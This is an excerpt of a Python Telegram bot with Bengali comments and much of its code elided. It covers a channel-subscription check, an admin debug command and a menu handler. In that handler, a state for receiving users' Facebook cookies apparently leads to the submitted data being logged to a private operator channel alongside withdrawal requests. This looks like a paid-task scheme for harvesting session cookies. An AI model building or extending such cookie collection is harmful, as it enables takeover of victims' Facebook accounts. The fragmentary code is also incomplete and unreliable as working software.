...
# টাস্ক ও উইথড্র রিকোয়েস্ট লগ করার জন্য প্রাইভেট চ্যানেল
LOG_CHANNEL_ID = -1003916527223
...
def check_user_subscription(user_id, force=False):
    now = time.time()
    if not force:
        cached = subscription_cache.get(user_id)
        if cached and (now - cached[1] < SUBSCRIPTION_CACHE_SECONDS):
            return cached[0]
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        result = member.status in ['member', 'creator', 'administrator']
    except Exception as e:
        print(f"[SUBSCRIPTION CHECK ERROR] user_id={user_id}, error={e}")
        result = False
    subscription_cache[user_id] = (result, now)
    return result
...
# --- ডিবাগ কমান্ড: সাবস্ক্রিপশন চেক সরাসরি টেলিগ্রামে দেখার জন্য ---

@bot.message_handler(commands=['checksub'])
def debug_check_subscription(message):
    if not is_admin(message):
        return
    ...
    if len(args) > 1:
        try:
            ...
            pass
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, target_id)
        bot.reply_to(
            message,
            f"✅ **Success**\n\n"
...
def callback_check_sub(call):
    ...
    if check_user_subscription(user_id, force=True):
...
def handle_menu(message):
    ...
    if current_state == 'WAITING_FOR_FB_COOKIES':
        ...
        try:
            bot.send_message(LOG_CHANNEL_ID, channel_msg, parse_mode="Markdown")
        except:
            pass
        ...
        try:
            bot.send_message(LOG_CHANNEL_ID, channel_withdraw_msg, parse_mode="Markdown")
        except:
            pass
